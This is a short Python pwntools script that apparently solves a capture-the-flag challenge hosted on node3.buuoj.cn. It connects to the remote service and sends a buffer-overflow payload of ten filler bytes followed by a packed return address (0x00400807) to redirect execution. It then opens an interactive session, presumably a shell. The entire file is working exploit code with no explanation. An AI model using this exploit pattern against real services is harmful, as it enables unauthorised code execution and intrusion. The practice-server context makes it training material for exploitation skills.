from pwn import *
r = remote('node3.buuoj.cn',28776)
payload = 'a'*10+p64(0x00400807)
r.sendline(payload)
r.interactive()